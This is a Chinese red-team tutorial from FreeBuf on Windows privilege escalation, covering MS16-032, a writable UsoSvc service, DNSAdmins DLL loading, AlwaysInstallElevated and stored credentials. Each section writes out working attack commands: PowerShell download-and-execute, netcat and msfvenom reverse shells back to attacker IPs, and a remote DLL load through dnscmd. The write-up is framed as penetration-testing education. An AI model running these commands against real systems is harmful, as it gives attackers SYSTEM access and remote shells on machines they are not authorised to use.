> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.freebuf.com](https://www.freebuf.com/articles/system/263139.html)

> 本节主要针对 Windows 操作系统下的权限提升进行介绍。

本文与 “酒仙桥六号部队” 的公众号文章《红队测试之 Linux 提权小结》是兄弟篇，本节主要针对 Windows 操作系统下的权限提升进行介绍，提权是后渗透重要的一环节，在权限较低的情况下，站在攻击者的视角进行内部网络安全测试、系统安全测试、应用安全测试等方面会出现“束缚”，所测试出的质量与结果也会不同。本文基于 Win 操作系统下分别从内核漏洞、权限配置、DLL 注入、注册表等方面展开介绍，其中包含漏洞本身的介绍、漏洞复现过程等内容的展现。该提权内容的阅读没有前后顺序，可根据读者自身所需进行全文阅读或某方向内容的阅读。

提权背景
----

权限提升意味着用户获得不允许他使用的权限。比如从一个普通用户，通过 “手段” 让自己变为管理员用户，也可以理解为利用操作系统或软件应用程序中的错误，设计缺陷或配置错误来获得对更高访问权限的行为。

为什么我们需要提权
---------

> 读取 / 写入敏感文件
> 
> 重新启动之后权限维持
> 
> 插入永久后门

Windows 提权的常见方法
---------------

> 1. 内核漏洞
> 
> 2. 错误的服务权限配置
> 
> 3.DLL 注入
> 
> 4. 始终以高权限安装程序
> 
> 5. 凭证存储

内核漏洞
----

### 漏洞介绍

内核漏洞利用程序是利用内核漏洞来执行具有更高权限的任意代码的程序。成功的内核利用通常会以 root 命令提示符的形式为攻击者提供对目标系统的超级用户访问权限。

### 漏洞复现

接下来我们以 MS16-032 来做演示，

给大家介绍下检查 Windows 提权辅助工具，[**wesng**](https://github.com/bitsadmin/wesng) 主要帮助检测 Windows 安全缺陷，是 Windows Exploit Suggesters 的升级版，通过读取加载 systeminfo 命令的结果来输出漏洞利用建议。

```
https://github.com/bitsadmin/wesng.git


```

1. 将 wesng 下载到本地主机上，先升级最新的漏洞数据库。

python wes.py --update

![](https://image.3001.net/images/20210205/1612508794_601cee7a47cc1cb49a39a.gif!small)

2. 将目标机器的 systeminfo 命令的结果输出并保存，使用 wesng 进行检查。

![](https://image.3001.net/images/20210205/1612508804_601cee840f5557c037ab9.gif!small)

发现只安装 3 个补丁，可以查看输出结果来找对应的漏洞利用代码。

![](https://image.3001.net/images/20210205/1612508814_601cee8e2503c287c7ee2.gif!small)

3. 下载 https://www.exploit-db.com/exploits/39719 里面的漏洞利用

使用 powershell 下载漏洞利用代码并执行

```
Powershell IEX (New-Object Net.WebClient).DownloadString('http://X.X.X.X:8000/ms16-032.ps1');Invoke-MS16-032


```

![](https://image.3001.net/images/20210205/1612508825_601cee995f1d61c2a9d3f.gif!small)

错误的服务权限配置
---------

### 漏洞介绍

Microsoft Windows 服务（即以前的 NT 服务）能够创建可长时间运行的可执行应用程序。这些服务可以在计算机启动时自动启动，可以暂停和重新启动而且不显示任何用户界面。这种服务非常适合在服务器上使用，或任何时候，为了不影响在同一台计算机上工作的其他用户，需要长时间运行功能时使用。还可以在不同登录用户的特定用户帐户或默认计算机帐户的安全上下文中运行服务。Windows 服务 (Windows Services) 通常使用本地系统账户启动。如果我们拥有可以修改服务配置权限的话，可以将服务启动的二进制文件替换成恶意的二进制文件，重新启动服务后执行恶意的二进制文件，可以获取到 system 权限。

### 漏洞复现

1. 首先需要在找到存在配置权限错误的服务，这里推荐大家使用 powerup.ps1，

```
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc


```

powerup 是一个非常好用的 windows 提权辅助脚本，可以检查各种服务滥用，dll 劫持，启动项等，来枚举系统上常见的提权方式。

接下来我们以 CVE-2019-1322 进行演示，Update Orchestrator 服务的运行方式为 NT AUTHORITY\SYSTEM，并且在 Windows 10 和 Windows Server 2019 上已默认启用。首先使用 powershell 加载 powerup.ps1，需要在 powerup.ps1 结尾中加入 InvokeAllchecks 或者使用 powershell 执行时加载，执行如下代码：

```
Powershell -exec bypass IEX(new-object Net.webclient).downloadstring('http://192.168.25.31:8000/PowerUp.ps1'); InvokeAllchecks


```

发现 USOSVC 可以被修改和重启。

![](https://image.3001.net/images/20210205/1612508843_601ceeabb4e7d6f2c4bdf.jpg!small)

2. 接下来我们上传 nc，此处可以换成 cs 或 msf 生成的任意可执行文件 ，此处有一个小坑，binPath = 和路径中间有一个空格，修改服务启动的可执行程序后，启动服务。

**1**）停止 USOSVC 服务

```
PS C:\Windows\system32> sc stop UsoSvc


```

**2**）将服务执行的 exe 文件修改为 nc，反弹 shell

```
PS C:\Windows\system32> sc config usosvc binPath= "C:\GitStack\gitphp\nc.exe 192.168.25.31 4455 -e cmd.exe"


```

**3**）将服务状态设置为自动启动

```
PS C:\Windows\system32> sc config usosvc start=auto 


```

**4**）启动服务

```
PS C:\Windows\system32> sc start usosvc


```

按部就班的执行

![](https://image.3001.net/images/20210205/1612508857_601ceeb9da7a870c71c53.jpg!small)

执行后，设置并开启服务

![](https://image.3001.net/images/20210205/1612508870_601ceec6e3519ba01d2cb.jpg!small)

![](https://image.3001.net/images/20210205/1612508881_601ceed180be0894b7668.jpg!small)

![](https://image.3001.net/images/20210205/1612508895_601ceedfcf80213de81f3.jpg!small)

DLL 注入提权
--------

### 漏洞介绍

DLL 注入提权是一种利用应用程序错误加载 DLL 的技术。可以使用此技术来实现提权以及持久控制。

首先，让我们了解应用程序加载 DLL 的机制。

DLL 代表动态链接库，它是一个库文件，其中包含可被多个应用程序同时动态访问和使用的代码和数据。DLL 是 Microsoft 引入的，用于实现共享库的概念。

### 漏洞复现

如果一个用户是 DNSAdmins 组成员，可以以管理员权限加载 DLL，我们可以通过 msfvenom 来生成一个反弹 shell 的 DLL 文件获取管理员权限。

1. 首先查看我们的用户权限，我们的用户在 DNSAdmin 组里面![](https://image.3001.net/images/20210205/1612508927_601ceeff08197b4f70915.gif!small)

2. 使用 msfvenom 生成一个反弹 shell。

```
Msfvenom -p windows/x64/shell_reverse_tcp LHOST=X.X.X.X LPORT=443 -f dll -o rev.dll


```

![](https://image.3001.net/images/20210205/1612508965_601cef2516982f4362793.gif!small)

3. 在攻击者机器启动 smb 服务，通过 UNC 来读取攻击机上生成的 DLL 文件。

![](https://image.3001.net/images/20210205/1612508989_601cef3d17d389ecdbb15.jpg!small)

4. 在目标机器上调用 dnscmd 来执行加载远程 DLL 文件，普通用户执行 dnscms 可能会失败。

```
PS C:\Users\> dnscmd.exe /config /serverlevelplugindll \\X.X.X.X\s\rev.dll
Registry property serverlevelplugindll successfully reset.
Command completed successfully.
PS C:\Users\> sc.exe \\resolute stop dns
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530* 
 PS C:\Users\> sc.exe \\resolute start dns
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2644
        FLAGS              :


```

5. 获取到 system 权限的 shell

![](https://image.3001.net/images/20210205/1612509000_601cef48b7faba453bb36.gif!small)

注册表键提权
------

### 漏洞介绍

AlwaysInstallElevated 是一项功能，可为 Windows 计算机上的所有用户（尤其是低特权用户）提供运行任何具有高权限的 MSI 文件的功能。MSI 是基于 Microsoft 的安装程序软件包文件格式，用于安装，存储和删除程序。

通过组策略中的 windows installer 来进行配置，默认情况下该配置是关闭的。

### 漏洞复现

1. 首先需要检查计算机是否开启了该配置，也可以通过执行 powerup.ps1 来检查权限。

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


```

![](https://image.3001.net/images/20210205/1612509013_601cef557ff8109fb7756.gif!small)

2. 使用 msfvenom 生成一个 msi 文件用来反弹 shell。

```
Msfvenom -p windows/meterpreter/reverse_tcp lhost=X.X.X.X lport=4567 -f msi > 1.msi


```

![](https://image.3001.net/images/20210205/1612509033_601cef69af6295aa70a98.jpg!small)

3. 安装 msi，获取反弹 shell

```
msiexec /quiet /qn /i C:\Windows\Temp\1.msi


```

![](https://image.3001.net/images/20210205/1612509045_601cef750523996e64de9.gif!small)

凭证存储
----

### 漏洞介绍

Windows7 之后的操作系统提供了 windows 保险柜功能 (Windows Vault),Window 保险柜存储 Windows 可以自动登录用户的凭据，这意味着**需要凭据才能访问资源**（服务器或网站）的任何 **Windows 应用程序都可以使用此凭据管理器**和 Windows Vault 并使用提供的凭据代替用户一直输入用户名和密码。

除非应用程序与凭据管理器进行交互，否则我认为它们不可能对给定资源使用凭据。因此，如果您的应用程序要使用保管库，则应以某种方式**与凭证管理器进行通信，并**从默认存储保管库中**请求该资源的凭证**。

### 漏洞复现

1. 通过 cmdkey /list 列出存储的所有用户的凭据，发现 administrator 凭据被存储在了本机上。

![](https://image.3001.net/images/20210205/1612509055_601cef7f4a9c61a589e8f.jpg!small)

![](https://image.3001.net/images/20210205/1612509072_601cef90818d43a0ed1b0.gif!small)

2. 使用 runas 来以管理员权限启动 nc 反弹 shell

```
Runas /user:administrator /savecred "nc.exe -e cmd.exe X.X.X.X 1337"


```

![](https://image.3001.net/images/20210205/1612509092_601cefa47cb6dba561ad9.gif!small)

3. 在攻击机启动监听，获取反弹 shell。

![](https://image.3001.net/images/20210205/1612509102_601cefae9dc2d784cb825.jpg!small)

技术小结
----

**在测试项目中，测试人员通常会设法获取 shell**，然后再进行下一步的操作，本文旨在给大家提供一些从普通权限到 system 权限的思路，基本总结如下：

> **1. ****通过查看内核版本，寻找是否存在可以利用的提权 EXP****。**
> 
> **2. 通过信息收集，查看机器配置，账户密码等查看是否可以利用。**
> 
> **3. ****通过查看系统的应用，或者第三方应用，查找服务本身是否存在问题，或者是否配置存在问题，如大家常见的 mysql**** 提权**